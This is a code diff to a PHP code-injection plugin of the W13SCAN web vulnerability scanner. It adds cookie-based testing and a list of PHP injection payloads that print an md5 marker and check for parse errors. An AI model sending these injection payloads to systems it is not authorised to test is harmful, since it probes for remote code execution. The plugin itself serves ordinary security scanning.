@@ -10,15 +10,15 @@ import re
 
 import requests
 
-from lib.common import prepare_url, md5
-from lib.const import acceptedExt, ignoreParams
+from lib.common import prepare_url, md5, paramToDict
+from lib.const import acceptedExt, ignoreParams, PLACE
 from lib.output import out
 from lib.plugins import PluginBase
 
 
 class W13SCAN(PluginBase):
     name = 'PHP代码注入'
-    desc = '''暂只支持Get请求方式和回显型的PHP代码注入'''
+    desc = '''暂只支持Get请求方式和回显型的PHP代码注入以及cookie中的代码注入'''
 
     def audit(self):
         method = self.requests.command  # 请求方式 GET or POST
@@ -33,24 +33,46 @@ class W13SCAN(PluginBase):
         params = self.requests.params
         netloc = self.requests.netloc
 
+        regx = 'Parse error: syntax error,.*?\sin\s'
+        randint = random.randint(5120, 10240)
+        verify_result = md5(str(randint).encode())
+        payloads = [
+            "print(md5({}));",
+            ";print(md5({}));",
+            "';print(md5({}));$a='",
+            "\";print(md5({}));$a=\"",
+            "${{@print(md5({}))}}",
+            "${{@print(md5({}))}}\\",
+            "'.print(md5({})).'"
+        ]
+
         if method == 'GET':
+            # cookie
+            if headers and "cookie" in headers:
+                cookies = paramToDict(headers["cookie"], place=PLACE.COOKIE)
+                del headers["cookie"]
+                if cookies:
+                    for k, v in cookies.items():
+                        cookie = copy.deepcopy(cookies)
+                        for payload in payloads:
+                            if payload[0] == "p":
+                                cookie[k] = payload.format(randint)
+                            else:
+                                cookie[k] = v + payload.format(randint)
+                            r = requests.get(url, headers=headers, cookies=cookie)
+                            html1 = r.text
+                            if verify_result in html1:
+                                out.success(url, self.name, payload="{}:{}".format(k, cookie[k]), raw=r.raw)
+                                break
+                            if re.search(regx, html1, re.I | re.S | re.M):
+                                out.success(url, self.name, payload="{}:{}".format(k, cookie[k]), raw=r.raw)
+                                break
+
             if p.query == '':
                 return
             exi = os.path.splitext(p.path)[1]
             if exi not in acceptedExt:
                 return
-
-            regx = 'Parse error: syntax error,.*?\sin\s'
-            randint = random.randint(1, 256)
-            verify_result = md5(str(randint).encode())
-            payloads = [
-                "print(md5({}));",
-                ";print(md5({}));",
-                "';print(md5({}));$a='",
-                "\";print(md5({}));$a=\"",
-                "${{@print(md5({}))}}",
-                "${{@print(md5({}))}}\\"
-            ]
 
             for k, v in params.items():
                 if k.lower() in ignoreParams:
